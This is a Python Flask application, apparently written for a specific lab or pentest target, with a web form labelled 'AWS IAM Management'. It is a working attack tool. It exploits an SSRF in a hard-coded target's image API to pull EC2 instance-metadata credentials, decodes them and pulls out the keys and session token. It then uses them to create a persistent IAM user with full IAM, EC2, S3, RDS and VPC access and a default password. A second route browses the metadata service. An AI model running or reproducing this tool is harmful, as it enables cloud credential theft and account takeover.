from flask import Flask, request, render_template_string
import requests
import base64
import re
import boto3
import json

app = Flask(__name__)

# HTML 템플릿
HTML_TEMPLATE = '''
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>AWS IAM Management</title>
    <style>
        #user-id-input, #metadata-path-input {
            display: none;
        }
    </style>
    <script>
        function showUserIdInput() {
            document.getElementById('user-id-input').style.display = 'block';
            document.getElementById('metadata-path-input').style.display = 'none';
        }
        function showMetadataPathInput() {
            document.getElementById('user-id-input').style.display = 'none';
            document.getElementById('metadata-path-input').style.display = 'block';
        }
    </script>
</head>
<body>
    <h1>AWS IAM Management</h1>
    <form action="/action" method="get">
        <div id="user-id-input">
            <label for="username">Enter IAM Username to Create:</label>
            <input type="text" id="username" name="username">
            <input type="hidden" name="action" value="1">
            <button type="submit">Submit</button>
        </div>
        <div id="metadata-path-input">
            <label for="path">Enter Metadata Path (optional):</label>
            <input type="text" id="path" name="path" placeholder="/latest/meta-data/">
            <input type="hidden" name="action" value="2">
            <button type="submit">Submit</button>
        </div>
        <button type="button" onclick="showUserIdInput()">1번: IAM 사용자 생성</button>
        <button type="button" onclick="showMetadataPathInput()">2번: 메타데이터 탐색</button>
    </form>
    <hr>
    <div>
        {{ result | safe }}
    </div>
</body>
</html>
'''

def fetch_aws_credentials(image_url):
    try:
        url = "http://43.202.240.147:8080/api/user/image"
        params = {
            'imageUrl': image_url
        }
        headers = {
            'Host': '43.202.240.147:8080',
            'Accept': 'application/json, text/plain, */*',
            'Accept-Language': 'ko-KR',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.6478.127 Safari/537.36',
            'Origin': 'http://3.34.171.35',
            'Referer': 'http://3.34.171.35/',
            'Accept-Encoding': 'gzip, deflate, br',
            'Connection': 'keep-alive'
        }

        response = requests.get(url, headers=headers, params=params)
        response.raise_for_status()  # 요청이 성공했는지 확인

        # 응답 내용 출력
        print("Response content:", response.text)

        # Base64 디코딩
        decoded_data = base64.b64decode(response.text).decode('utf-8')
        return decoded_data
    except requests.exceptions.RequestException as e:
        print(f"Error: {e}")
        return None
    except Exception as e:
        print(f"Error decoding data: {e}")
        return None

def extract_credentials(decoded_data):
    try:
        access_key = re.search(r'"AccessKeyId"\s*:\s*"([^"]+)"', decoded_data).group(1)
        secret_key = re.search(r'"SecretAccessKey"\s*:\s*"([^"]+)"', decoded_data).group(1)
        session_token = re.search(r'"Token"\s*:\s*"([^"]+)"', decoded_data).group(1)
        return access_key, secret_key, session_token
    except Exception as e:
        print(f"Error extracting credentials: {e}")
        return None

def create_user_and_attach_policies(access_key, secret_key, session_token, username, region='us-east-1'):
    session = boto3.Session(
        aws_access_key_id=access_key,
        aws_secret_access_key=secret_key,
        aws_session_token=session_token,
        region_name=region
    )

    try:
        iam = session.client('iam')

        iam.create_user(UserName=username)
        print(f'User {username} created successfully.')

        policies = [
            'arn:aws:iam::aws:policy/IAMFullAccess',
            'arn:aws:iam::aws:policy/AmazonEC2FullAccess',
            'arn:aws:iam::aws:policy/AmazonS3FullAccess',
            'arn:aws:iam::aws:policy/AmazonRDSFullAccess',
            'arn:aws:iam::aws:policy/AmazonVPCFullAccess'
        ]

        for policy_arn in policies:
            iam.attach_user_policy(UserName=username, PolicyArn=policy_arn)
            print(f'Policy {policy_arn} attached to user {username}.')

        password = 'DefaultPassword123!'  
        iam.create_login_profile(
            UserName=username,
            Password=password,
            PasswordResetRequired=True
        )
        print(f'Login profile created for user {username}.')

        return username, password

    except Exception as e:
        print(f'Error creating user or attaching policies: {e}')
        return None, None

def generate_console_login_link(account_id):
    base_url = "https://signin.aws.amazon.com/console"
    destination = "https%3A%2F%2Fconsole.aws.amazon.com%2F"
    login_link = f"{base_url}?destination={destination}&account={account_id}"
    return login_link

def explore_metadata(path):
    try:
        base_url = "http://169.254.169.254/latest"
        url = f"{base_url}/{path.lstrip('/')}"
        response = requests.get(url)
        response.raise_for_status()
        decoded_data = response.text
        return f"<pre>{decoded_data}</pre>"
    except requests.exceptions.RequestException as e:
        return f"Error exploring metadata: {e}"

@app.route('/')
def index():
    result = request.args.get('result', '')
    return render_template_string(HTML_TEMPLATE, result=result)

@app.route('/action', methods=['GET'])
def action():
    action = request.args.get('action')
    result = ""
    if action == '1':
        username = request.args.get('username')
        if not username:
            return redirect(url_for('index', result="Please enter a username."))
        
        image_url = 'http://169.254.169.254/latest/meta-data/iam/security-credentials/ec2_test'
        decoded_data = fetch_aws_credentials(image_url)
        if decoded_data:
            credentials = extract_credentials(decoded_data)
            if credentials:
                access_key, secret_key, session_token = credentials

                sts = boto3.client('sts', aws_access_key_id=access_key, aws_secret_access_key=secret_key, aws_session_token=session_token)
                account_id = sts.get_caller_identity()['Account']

                new_username, new_password = create_user_and_attach_policies(access_key, secret_key, session_token, username)

                if new_username and new_password:
                    result = f'User {new_username} created with initial password {new_password}<br>'
                    login_link = generate_console_login_link(account_id)
                    result += f'User can login using the following link: <a href="{login_link}">{login_link}</a>'
                else:
                    result = 'Failed to create user or attach policies.'
            else:
                result = 'Failed to extract AWS credentials.'
        else:
            result = 'Failed to fetch AWS credentials.'
        return render_template_string(HTML_TEMPLATE, result=result)
    elif action == '2':
        path = request.args.get('path', '/latest/meta-data/')
        result = explore_metadata(path)
        return render_template_string(HTML_TEMPLATE, result=result)

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=8080)
